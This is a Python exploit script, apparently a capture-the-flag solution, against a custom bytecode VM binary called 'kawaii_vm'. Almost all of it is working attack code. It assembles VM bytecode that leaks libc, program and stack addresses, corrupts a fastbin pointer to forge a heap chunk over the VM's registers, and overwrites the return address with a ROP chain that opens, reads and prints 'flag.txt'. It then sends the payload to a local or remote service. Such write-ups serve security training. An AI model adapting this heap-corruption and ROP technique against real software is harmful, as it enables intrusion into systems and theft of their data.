from dn3 import *

libc = ELF("lib/libc.so.6")

#context.log = 0
context.terminal = "tmux new-window".split()

breakpoints = '''
b init_vm
c
'''

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    #io = remote("nc 35.200.150.150 32420")
    io = remote("nc localhost 1337")
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process("./kawaii_vm.stripped")
else:
    io = gdb("./kawaii_vm", gdbscript=breakpoints)

DeathNot3(io)

kopcodes = {
    "HALT" :    0xff,
    "ADD"  :    0x30,
    "SUB"  :    0x31,
    "MUL"  :    0x32,
    "DIV"  :    0x33,
    "XOR"  :    0x34,
    "PUSH" :    0x35,
    "POP"  :    0x36,
    "SET"  :    0x37,
    "GET"  :    0x38,
    "MOV"  :    0x39,
    "SHR"  :    0x3a,
    "SHL"  :    0x3b,
    "RESET":    0x40,
    "HALT" :    0xff,
    "X0"   :    0x0,
    "X1"   :    0x1,
    "X2"   :    0x2,
    "X3"   :    0x3
}

def assemble(code):
    bytecode = ""
    prev_opcode = ""

    for line in code.split("\n"):

        line = line.rstrip(" ").lstrip(" ")

        if line.startswith("#"):
            continue

        for word in line.split():
            word = word.upper()
            if(word not in kopcodes.keys()):
                try:
                    if "X" in word:
                        num = int(word,16)
                    else:
                        num = int(word)

                    if prev_opcode == "SET" or prev_opcode == "GET" or prev_opcode == "MOV":
                        bytecode += p32(num)
                    continue
                except:
                    continue


            bytecode += chr(kopcodes[word])
            if not word.startswith("X"):
                prev_opcode = word.upper()

    return bytecode

#LEAK OFFSETS
environ_offset     =   0x7cc98
libc_offset        =   0x94058
fastbin_offset     =   0x7aef0
elf_offset         =   0x940b0 

#EXTRA OFFSETS
array_offset       =   0x13000
fake_chunk_offset  =   array_offset - 4*0x100
rip_offset         =   0xa8

#PAYLOAD OFFSETS
flag_offset        =   0x5020
bss_offset         =   0x7800

pop_rdi            =   0x23835
pop_rsi            =   0x25151
pop_rdx_rbx        =   0x82699
puts               =   libc.symbols.puts
open64             =   libc.symbols.open
read               =   libc.symbols.read

LIBC = 0x0
EXE = 0x4
STK = 0x2

def mov_push(val):
    return f"""
        mov x1 {val >> 32}
        mul x1 x1 x0
        mov x3 {val & 0xffffffff}
        add x1 x1 x3
        push x1
    """

def craft_push(src,offset):
    return f"""
        get x1 {src+1}
        get x2 {src} 
        mul x1 x1 x0
        add x1 x1 x2
        mov x3 {abs(offset)}
        {"add" if offset > 0 else "sub"} x1 x1 x3
        push x1
    """

kawaii_code = f"""
# Craft fake chunk
mov x0 0x41
set x0 0x102

# Get ELF leak
get x1 {elf_offset+1}
get x2 {elf_offset}
set x1 0x5
set x2 0x4

# Get stack leak
get x1 {environ_offset+1}
get x2 {environ_offset}
set x1 0x3
set x2 0x2

# Get libc leak
get x1 {libc_offset+1}
get x2 {libc_offset}
set x1 0x1
set x2 0x0

# Offset to fake chunk
mov x0 0x10000
mul x0 x0 x0
mul x1 x1 x0
add x1 x1 x2

mov x3 {fake_chunk_offset}
sub x1 x1 x3

# Overwrite fastbin fd with fake chunk
set x1 {fastbin_offset}
div x1 x1 x0
set x1 {fastbin_offset+1}

# Faking fd ptr of fake chunk
mul x1 x1 x0
add x1 x1 x2
mov x3 {fake_chunk_offset}
sub x1 x1 x3
mov x3 0x1000
div x1 x1 x3
set x1 0x104

div x1 x1 x0
set x1 0x105

# Get regs allocated on fake chunk
reset

mov x0 0x10000
mul x0 x0 x0

# Set reg->sp = rip
get x1 0x3
get x2 0x2
mov x3 {rip_offset}
sub x2 x2 x3

set x1 0x10f
set x2 0x10e

{mov_push(upk("flag.txt"))}

{craft_push(LIBC, puts)}

{craft_push(EXE, bss_offset)}

{craft_push(LIBC, pop_rdi)}

{craft_push(LIBC, read)}

{mov_push(0x0)}

{mov_push(0x40)}

{craft_push(LIBC, pop_rdx_rbx)}

{craft_push(EXE, bss_offset)}

{craft_push(LIBC, pop_rsi)}

{mov_push(0)}

{craft_push(LIBC, pop_rdi)}

{craft_push(LIBC, open64)}

{mov_push(4)}

{craft_push(LIBC, pop_rsi)}

{craft_push(STK, -rip_offset-8)}

{craft_push(LIBC, pop_rdi)}

halt
"""

bytecode = assemble(kawaii_code)
print(len(bytecode))
 
sla("> ", "y")
sla("> ", "NaN")
sa("> ", bytecode)
rl()

interactive()
